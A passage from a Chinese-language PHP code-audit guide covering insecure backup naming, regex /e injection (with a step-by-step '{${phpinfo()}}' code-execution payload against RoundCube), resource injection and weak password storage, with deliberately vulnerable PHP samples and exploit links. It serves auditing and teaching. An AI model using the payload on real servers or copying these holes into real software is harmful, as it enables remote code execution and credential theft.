+大部分的商业管理系统（CMS）,例如：OS-commerce (在某些版本中)。
+
+15 –不安全的随机命名Session / Cookie / 备份文件(Medium):
+在命名session & cookie &备份文件时，将其随机化，可能会出卖它们。
+例如：
+<?php
+$rnd = rand(1,100);
+$fp = fopen($rnd.'_backup_.sql', 'w');
+fwrite($fp, $db );
+fclose($fp);
+?>
+本例中：将备份文件写入到"$rand_backup_.sql"中。在代码第2行中，我们可以看到$rand参数，它随机生成1-100之间的任意数。攻击者可写入代码以暴力破解文件名。因此当我们在生成Session & Cookie的时候，应当谨慎地使用随机函数。
+
+攻击实例:
+PHP-Fusion <= 6.00.105 Accessible Database Backups Download Exploit:
+http://www.milw0rm.com/exploits/1068
+
+16 – HTML Comment中提供的详细信息 (Low):
+HTML标签可用于寻踪WEB程序或者泄漏WEB程序结构。
+
+17 – 默认安装的多余文件 (medium):
+一些PHP CMS或者WEB程序在安装完成后并没有删除安装文件，导致攻击者可以控制其中的数据或者重设管理员密码。
+
+18 – 正则表达式（Regular Expression）漏洞(High):
+Regular Expression Injection或者RegEx Injection通过替换正则表达式中的修饰符e而将代码注入到WEB程序中。Perl支持这个修饰符，其它技术包括PCRE(Perl-compatible regular expressions) library。如果该漏洞被使用，其替换内容是可估计的。这种方法很强大，因为它不仅允许使用变量名，而且支持其它命令。
+
+Example (RoundCube Bug):
+RoundCube使用了html2text函数，它存在一个评论漏洞：用户输入的数据可被PHP引擎分析并执行。这将导致一些被恶意构造的输入数据被WEB服务器当作PHP代码来执行。这个漏洞是由于PHP中使用的preg_replace()函数用了'e' flag而导致的。在正则表达式中使用’e’将允许PHP对输入数据进行处理。例如我们想将小写字符串更改为大写的，可以使用以下代码：
+<?php
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', 'test');
+?>
+preg_replace函数允许程序员使用PHP中的strtoupper ()函数去处理输入的字符串，这将导致用户可以输入包含PHP命令的字符串，以致造成不良后果。
+利用该漏洞最绝的一招就是将PHP命令伪装成变量来执行它们。在正常的操作中，preg_replace允许用户在变量中传输并替换它们。例如：
+
+<?php
+$foo = 'bar';
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', '$foo');
+?>
+
+将输出预料中的“BAR”。但当使用：
+
+<?php
+$foo = 'bar';
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', 'phpinfo()');
+?>
+
+将会简单地输出"PHPINFO()"。为了使PHP引擎去解释命令，我们必须将其分配给一个变量。通常可以简单地使用一个'$'作为分隔符，并用上PHP大括号，于是：
+<?php
+print ${phpinfo()};
+?>
+
+将尽职地输出phpinfo()命令的输出结果。但如果我们将其发送给原先的preg_replace()函数，那么将会发生错误，你会注意到：
+<?php
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', '${phpinfo()}');
+?>
+产生了下列错误：
+[Tue Jan 13 09:24:48 2009] [error] [client 192.168.0.50] PHP Fatal error: preg_replace() [<a
+href='function.preg-replace'>function.preg-replace</a>]: Failed evaluating code:
+\nstrtoupper("${phpinfo()}") in /var/www/html/exploit.php on line 22
+
+为了避免发生错误，我们需要再添加一个大括号，以执行赋予的命令。更改后的代码如下：
+<?php
+print preg_replace('/(.*)/e', 'strtoupper("\\1")', '{${phpinfo()}}');
+?>
+RoundCube漏洞出现在bin/html2text.sh中的行6中：
+$converter = new html2text(html_entity_decode($HTTP_RAW_POST_DATA, ENT_COMPAT, 'UTF-8'));
+
+攻击实例:
+Analysis of the RoundCube html2text Vulnerability
+http://www.milw0rm.com/exploits/7549
+http://www.securiteam.com/exploits/6W00L0KC0I.html
+
+更多信息：
+http://hauser-wenz.de/playground/papers/RegExInjection.pdf
+
+19 – Resource Injection (Medium):
+当遇到下面两种情况时资源注入漏洞就发生了:
+1. 攻击者可以指定标识符去访问系统资源。
+例如攻击者可以指定一个端口号去连接网络资源。
+2. 通过指定资源，攻击者可以获得原本并未许可的权限。
+例如程序可能会允许攻击者发送敏感信息给第三方服务端。
+下面看一看关于此漏洞更为详细的路径操作描述。
+Example:下列代码中读取了HTTP request中的hostname，并使用它去连接决定票价的数据库。
+
+<?php
+$host=$_GET['host'];
+$dbconn = pg_connect("host=$host port=1234 dbname=ticketdb");
+...
+$result = pg_prepare($dbconn, "my_query", 'SELECT * FROM pricelist WHER
+E name = $1');
+$result = pg_execute($dbconn, "my_query", array("ticket"));
+?>
+
+这类可被用户的输入数据影响到的资源意味着这类内容存在危险。例如，数据中包含特定的字符，比如句号，斜杆，反斜杆，当使用这种可危害到文件系统的方式时都是存在风险的。同时，包含URL和URI的数据对于创建远程连接也是存在风险的。
+
+攻击实例:
+Synthetic Attack [XSS , RI ] :
+http://www.milw0rm.com/exploits/7866
+
+20 – 弱口令: (Low)
+你必须检查一下：
+你在数据库中使用未加密的明码。
+加密密码（例如：MD5），但还不够安全。
+保存密码在[.txt, .ini, .xml...]等文件中，这些文件都有可能被攻击者读取到。
+使用弱口令。
+例如password.xml（可被攻击者读取）
+
+攻击:
+Http://viktim.com/password.xml
+
+<?xml version="1.0" ?>
+<novo-xml>
+<register>
+<client-id>test</client-id>
+<password>'.$username.'</password>
+<user-id>'.$password.'</user-id>
+<phone-num>'.$phone.'</phone-num>
+<app-id>test</app-id>
+<channel>I</channel>
+<user-type>upgrade</user-type>
+</register>
+</novo-xml>
+
+通过 password.xml进行认证：
+
+Login.php
+<form method="post" action="login.php">
+Username: <input type="text" name="username">
+<br />
+Password: <input type="password" name="password">
+<br />
+<input type="submit" name="submit" value="Login">
+</form>
+
+<?php
+$file = "password.xml";
+$username = $_POST[‘username’];
+$password = $_POST[‘password’];
+if (file_exists($file))
+{
+　　　$xml = simplexml_load_file($file);
+　　　$count = 0;
+　　　foreach($xml->username as $currUser)
+　　　{
+　　　　　　if (strtolower($currUser) == strtolower($username))
+　　　　　　{
+　　　　　　break;
+　　　　　　}
+　　　　　　$count++;
+　　　}
+　　　　if ($xml->active[$count] == 1)
+　　　　{
+　　　　if (md5($password) == $xml->password[$count])
+　　　　{
+　　　　echo "Valid user logged in!";
+　　　　}else{
+　　　　echo "Password does not match. Come on! Try harder!";
+　　　　}
+}
+else{
+　　　echo "User is inactive. Choose another!";
+}
+}else{
+echo "Critical Error: File not found!";
+}
+?>
+
+攻击实例:
+Passwords Decrypted for UPB <= 1.9.6:
+http://www.securityfocus.com/bid/13975/exploit
+
+Section 2: PHP源码审计自动化( PHP Fuzzer )
+1- Codescan PHP[$]:
+http://www.codescan.com/
+
+
+2- Rats [free] :
+http://www.fortify.com/security-resources/rats.jsp
+3- Pixy [sqli – xss] :
+http://pixybox.seclab.tuwien.ac.at/
+
+问题：
+本文并未完全涉及PHP源码安全检阅（审计），由于时间仓促，因此对于文中所造成的错误表示抱歉。笔者无法保证，但有可能会发布本文的下一版本，以包含更多高级的方法。
+下面是一些可能在下一版本中会被讨论到的内容：
+更多的攻击实例
+PHPIDS防御
+更为危险的函数：CURL – socket – creat_function & ….
+讨论一些函数的安全使用
+关于PHP安全编程书籍的相关信息
+ETC
+
+资源：
+http://www.fortify.com
+http://wikipedia.com
+http://www.madirish.net
+http://www.owasp.org
+http://samate.nist.gov/
+http://searchsecuritychannel.techtarget.com/
+http://www.webappsec.org
+http://phpsec.org
+
+
